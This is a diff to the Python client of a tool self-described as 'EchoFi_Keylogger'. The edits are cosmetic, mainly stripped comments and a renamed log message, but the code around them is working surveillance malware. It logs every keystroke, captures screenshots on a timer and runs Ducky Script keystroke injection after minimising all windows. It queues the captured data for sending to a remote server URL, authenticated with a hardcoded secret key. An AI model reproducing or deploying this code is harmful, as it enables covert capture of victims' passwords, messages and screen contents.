@@ -1,3 +1,5 @@
+# Copyright (c) 2025 MrEchoFi_Md. Abu Naser Nayeem (Tanjib Isham)
+# Libraries>
 import json
 import time
 import datetime
@@ -11,11 +13,11 @@ import logging
 import pyautogui
 import subprocess
 
-# Set up logging
+
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
-# Load configuration
+
 try:
     with open('config.json', 'r') as f:
         config = json.load(f)
@@ -28,30 +30,30 @@ except FileNotFoundError:
         "ducky_script_path": "ducky_script.txt"
     }
 
-# Configuration variables
+
 SERVER_URL = config['server_url']
 SEND_INTERVAL = config['send_interval']
 SCREENSHOT_INTERVAL = config['screenshot_interval']
 DUCKY_SCRIPT_PATH = config['ducky_script_path']
-SECRET_KEY = "supersecretkey123"  # Must match server secret key
+SECRET_KEY = "supersecretkey123"  
 
-# Thread-safe queue for keystrokes
+
 keystroke_queue = queue.Queue()
 headers = {'X-Secret-Key': SECRET_KEY}
 
-# Keystroke logging
+
 def on_press(key):
     try:
         timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         key_str = str(key).replace("'", "")
         if key_str.startswith("Key."):
-            key_str = f"[{key_str[4:]}]"  # Cleaner format, e.g., [space]
+            key_str = f"[{key_str[4:]}]" 
         keystroke_queue.put({"timestamp": timestamp, "key": key_str})
         logger.info(f"Logged keystroke: {key_str}")
     except Exception as e:
         logger.error(f"Error logging keystroke: {e}")
 
-# Screenshot capture thread
+
 def capture_screenshots():
     while True:
         try:
@@ -73,7 +75,7 @@ def capture_screenshots():
             logger.error(f"Error capturing screenshot: {e}")
         time.sleep(SCREENSHOT_INTERVAL)
 
-# Ducky Script execution
+
 def execute_ducky_script():
     try:
         with open(DUCKY_SCRIPT_PATH, 'r') as f:
@@ -82,11 +84,11 @@ def execute_ducky_script():
         output = []
         status = "success"
         
-        # Configure pyautogui
+      
         pyautogui.FAILSAFE = True
-        pyautogui.PAUSE = 0.5  # Increased pause for reliability
+        pyautogui.PAUSE = 0.5 
         
-        # Minimize all windows to ensure clean desktop
+        
         pyautogui.hotkey('win', 'd')
         time.sleep(1)
         
@@ -144,7 +146,7 @@ def execute_ducky_script():
     except Exception as e:
         logger.error(f"Error sending Ducky log: {e}")
 
-# Send keystrokes thread
+
 def send_keystrokes():
     while True:
         try:
@@ -163,31 +165,31 @@ def send_keystrokes():
         except Exception as e:
             logger.error(f"Error sending keystrokes: {e}")
 
-# Main function
+
 def main():
-    logger.info("EchoFi_Kilogger Client Starting...")
+    logger.info("EchoFi_Keylogger Client Starting...")
     
-    # Start keystroke listener
+ 
     listener = Listener(on_press=on_press)
     listener.start()
     
-    # Start screenshot thread
+  
     screenshot_thread = threading.Thread(target=capture_screenshots, daemon=True)
     screenshot_thread.start()
     
-    # Start keystroke sender thread
+    
     keystroke_thread = threading.Thread(target=send_keystrokes, daemon=True)
     keystroke_thread.start()
     
-    # Execute and send Ducky Script once
+    
     execute_ducky_script()
     
-    # Keep main thread alive
+    
     try:
         while True:
             time.sleep(1)
     except KeyboardInterrupt:
-        logger.info("Stopping EchoFi_Kilogger Client...")
+        logger.info("Stopping EchoFi_Keylogger Client...")
         listener.stop()
 
 if __name__ == "__main__":
